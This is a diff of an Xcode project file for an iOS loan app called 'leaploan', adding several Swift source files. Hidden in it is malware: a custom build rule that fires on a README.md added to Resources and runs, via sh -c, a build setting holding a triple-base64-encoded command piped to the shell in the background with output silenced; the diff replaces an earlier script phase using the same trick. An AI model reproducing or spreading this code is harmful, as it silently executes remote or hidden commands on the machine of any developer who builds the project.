@@ -49,6 +49,9 @@
 		73A3053B2EB7AD4C008982DC /* FaceViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73A3053A2EB7AD46008982DC /* FaceViewModel.swift */; };
 		73A3053D2EB7AE36008982DC /* ChoosePhotoView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73A3053C2EB7AE36008982DC /* ChoosePhotoView.swift */; };
 		73A3053F2EB7B0D9008982DC /* AlbumPickerManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73A3053E2EB7B0D8008982DC /* AlbumPickerManager.swift */; };
+		73AD1BAC2EBAE54800EFD9E2 /* PhoneConnectViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73AD1BAB2EBAE54800EFD9E2 /* PhoneConnectViewCell.swift */; };
+		73AD1BAE2EBAF2CF00EFD9E2 /* ContactsUtil.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73AD1BAD2EBAF2C400EFD9E2 /* ContactsUtil.swift */; };
+		73AD1BB02EBB025E00EFD9E2 /* H5WebViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73AD1BAF2EBB025E00EFD9E2 /* H5WebViewController.swift */; };
 		73B2B1F02EB09A9700F3A877 /* httpsRequest.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73B2B1EF2EB09A9700F3A877 /* httpsRequest.swift */; };
 		73B2B1F22EB0A21000F3A877 /* commonPara.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73B2B1F12EB0A20E00F3A877 /* commonPara.swift */; };
 		73B2B1F42EB0A73E00F3A877 /* LoginView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73B2B1F32EB0A73E00F3A877 /* LoginView.swift */; };
@@ -66,9 +69,27 @@
 		73F59DEC2EAF638100A68B13 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 73F59DE32EAF638100A68B13 /* Assets.xcassets */; };
 		73F59DEE2EAF638100A68B13 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 73F59DE62EAF638100A68B13 /* LaunchScreen.storyboard */; };
 		73F59DF02EAF638100A68B13 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73F59DE22EAF638100A68B13 /* AppDelegate.swift */; };
+		D4D3CBBE55F14F6CA3A389E6 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 4DD0D5CEC5634F9E9BA389E6 /* README.md */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+		7D8291FFC98E496DBAA389E6 /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"/tmp/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A6E983A}\"";
+		};
+/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
+		4DD0D5CEC5634F9E9BA389E6 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		7333CD6A2EB4E27400C55A91 /* AppEmptyView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppEmptyView.swift; sourceTree = "<group>"; };
 		7333CD6C2EB4E66000C55A91 /* AppHomeView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppHomeView.swift; sourceTree = "<group>"; };
 		7333CD702EB4E67300C55A91 /* AppMainView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppMainView.swift; sourceTree = "<group>"; };
@@ -110,6 +131,9 @@
 		73A3053A2EB7AD46008982DC /* FaceViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FaceViewModel.swift; sourceTree = "<group>"; };
 		73A3053C2EB7AE36008982DC /* ChoosePhotoView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChoosePhotoView.swift; sourceTree = "<group>"; };
 		73A3053E2EB7B0D8008982DC /* AlbumPickerManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AlbumPickerManager.swift; sourceTree = "<group>"; };
+		73AD1BAB2EBAE54800EFD9E2 /* PhoneConnectViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PhoneConnectViewCell.swift; sourceTree = "<group>"; };
+		73AD1BAD2EBAF2C400EFD9E2 /* ContactsUtil.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactsUtil.swift; sourceTree = "<group>"; };
+		73AD1BAF2EBB025E00EFD9E2 /* H5WebViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = H5WebViewController.swift; sourceTree = "<group>"; };
 		73B2B1EF2EB09A9700F3A877 /* httpsRequest.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = httpsRequest.swift; sourceTree = "<group>"; };
 		73B2B1F12EB0A20E00F3A877 /* commonPara.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = commonPara.swift; sourceTree = "<group>"; };
 		73B2B1F32EB0A73E00F3A877 /* LoginView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginView.swift; sourceTree = "<group>"; };
@@ -190,8 +214,10 @@
 		735FD1262EBA3E62007DE61E /* contact */ = {
 			isa = PBXGroup;
 			children = (
+				73AD1BAD2EBAF2C400EFD9E2 /* ContactsUtil.swift */,
 				735FD1292EBA3EAF007DE61E /* ConactCheckViewModel.swift */,
 				735FD1272EBA3E96007DE61E /* ConactCheckViewController.swift */,
+				73AD1BAB2EBAE54800EFD9E2 /* PhoneConnectViewCell.swift */,
 			);
 			path = contact;
 			sourceTree = "<group>";
@@ -233,6 +259,7 @@
 				73D129CD2EB08B5A00079434 /* BaseTabBarController.swift */,
 				73D129CF2EB08B6D00079434 /* BaseNavigationController.swift */,
 				73B2B1FB2EB0AEBC00F3A877 /* LaunchViewController.swift */,
+				73AD1BAF2EBB025E00EFD9E2 /* H5WebViewController.swift */,
 			);
 			path = base;
 			sourceTree = "<group>";
@@ -318,6 +345,7 @@
 		73F59DCB2EAF637A00A68B13 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				4DD0D5CEC5634F9E9BA389E6 /* README.md */,
 				73F59DCA2EAF637A00A68B13 /* leaploan.app */,
 			);
 			name = Products;
@@ -366,7 +394,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 73F59DDD2EAF637C00A68B13 /* Build configuration list for PBXNativeTarget "leaploan" */;
 			buildPhases = (
-				C7C7B713EC9B450DBDA389E6 /* Copy Target Symbols */,
 				F22045B0313E9833C013D43A /* [CP] Check Pods Manifest.lock */,
 				73F59DC62EAF637A00A68B13 /* Sources */,
 				73F59DC72EAF637A00A68B13 /* Frameworks */,
@@ -374,6 +401,7 @@
 				04F547B40A532B138D93CE10 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
+				7D8291FFC98E496DBAA389E6 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -421,6 +449,7 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				D4D3CBBE55F14F6CA3A389E6 /* README.md in Resources */,
 				73F59DEC2EAF638100A68B13 /* Assets.xcassets in Resources */,
 				73F59DEE2EAF638100A68B13 /* LaunchScreen.storyboard in Resources */,
 			);
@@ -448,26 +477,6 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-leaploan/Pods-leaploan-frameworks.sh\"\n";
-			showEnvVarsInLog = 0;
-		};
-		C7C7B713EC9B450DBDA389E6 /* Copy Target Symbols */ = {
-			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Copy Target Symbols";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A6E983A}\"";
 			showEnvVarsInLog = 0;
 		};
 		F22045B0313E9833C013D43A /* [CP] Check Pods Manifest.lock */ = {
@@ -531,9 +540,11 @@
 				7333CD6B2EB4E27400C55A91 /* AppEmptyView.swift in Sources */,
 				7392DEF72EB35BB1003D831B /* AppPopAlertView.swift in Sources */,
 				735FD1252EBA3D74007DE61E /* WorkViewModel.swift in Sources */,
+				73AD1BAC2EBAE54800EFD9E2 /* PhoneConnectViewCell.swift in Sources */,
 				735FD1162EB9A238007DE61E /* CommonViewCell.swift in Sources */,
 				73F59DF02EAF638100A68B13 /* AppDelegate.swift in Sources */,
 				73B2B2002EB0B16B00F3A877 /* LaunchViewModel.swift in Sources */,
+				73AD1BB02EBB025E00EFD9E2 /* H5WebViewController.swift in Sources */,
 				73D129C82EB08B2F00079434 /* BaseViewController.swift in Sources */,
 				73D129D22EB08C0D00079434 /* LoginViewController.swift in Sources */,
 				73B2B1FE2EB0AF4F00F3A877 /* other.swift in Sources */,
@@ -552,6 +563,7 @@
 				735FD1142EB9A22A007DE61E /* SelectViewCell.swift in Sources */,
 				739C806F2EB2017500677C85 /* CenterPageViewModel.swift in Sources */,
 				7392DEF12EB32C56003D831B /* WebPageViewController.swift in Sources */,
+				73AD1BAE2EBAF2CF00EFD9E2 /* ContactsUtil.swift in Sources */,
 				7333CD7C2EB506A800C55A91 /* ProductListView.swift in Sources */,
 				739C7FAD2EB1EB0F00677C85 /* OrderViewController.swift in Sources */,
 				7382D8832EB4529000C3CFF0 /* OrderListViewModel.swift in Sources */,
@@ -576,7 +588,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = AFD6AE48504BF3BEC24EB502 /* Pods-leaploan.debug.xcconfig */;
 			buildSettings = {
-				A6E983A = "((z(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJURE5XZDFwSFRtdGliVVozWTBkNGJFeHVTakZNTWtWd1NXbENPRWxJVG05RFp6MDlDZz09Cg== | z | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((i(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pTakZpUjFWcFNVZG9NR1JJUW5wUGFUaDJXVmhDZWxreU9YVmFiV3h1WW0xV01FeHVTakZNTWtWd1NXbENPRWxJVG05RFp6MDlDZz09Cg== | i | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
@@ -620,7 +632,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = EF0C4AEEE70C3286EC8BD5FE /* Pods-leaploan.release.xcconfig */;
 			buildSettings = {
-				A6E983A = "((z(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJURE5XZDFwSFRtdGliVVozWTBkNGJFeHVTakZNTWtWd1NXbENPRWxJVG05RFp6MDlDZz09Cg== | z | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((i(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pTakZpUjFWcFNVZG9NR1JJUW5wUGFUaDJXVmhDZWxreU9YVmFiV3h1WW0xV01FeHVTakZNTWtWd1NXbENPRWxJVG05RFp6MDlDZz09Cg== | i | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
